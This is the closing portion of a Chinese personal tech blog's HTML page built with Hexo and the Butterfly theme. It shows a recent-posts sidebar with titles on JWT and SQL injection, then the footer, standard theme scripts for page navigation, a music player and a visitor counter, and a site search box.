onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JWT渗透与防御"/></a><div class="content"><a class="title" href="/archives/f9945f65.html" title="JWT渗透与防御">JWT渗透与防御</a><time datetime="2026-04-28T12:00:00.000Z" title="发表于 2026-04-28 20:00:00">2026-04-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/2004793d.html" title="Sql注入之注入手法"><img src="/./img/sql_injection.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Sql注入之注入手法"/></a><div class="content"><a class="title" href="/archives/2004793d.html" title="Sql注入之注入手法">Sql注入之注入手法</a><time datetime="2026-04-28T11:00:00.000Z" title="发表于 2026-04-28 19:00:00">2026-04-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/4a17b156.html" title="博客说明"><img src="https://jsd.012700.xyz/gh/jerryc127/CDN@latest/cover/default_bg2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="博客说明"/></a><div class="content"><a class="title" href="/archives/4a17b156.html" title="博客说明">博客说明</a><time datetime="2026-04-27T14:09:09.491Z" title="发表于 2026-04-27 22:09:09">2026-04-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/9508da4a.html" title="浏览器常用插件合集"><img src="/./img/plug_in.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="浏览器常用插件合集"/></a><div class="content"><a class="title" href="/archives/9508da4a.html" title="浏览器常用插件合集">浏览器常用插件合集</a><time datetime="2026-04-26T19:40:00.000Z" title="发表于 2026-04-27 03:40:00">2026-04-27</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By yunkun18</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div><div class="footer_custom_text">Hi, welcome to my <a href="https://blog.yunkun.top/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="/js/tw_cn.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-show-text.min.js" data-mobile="true" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      true
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
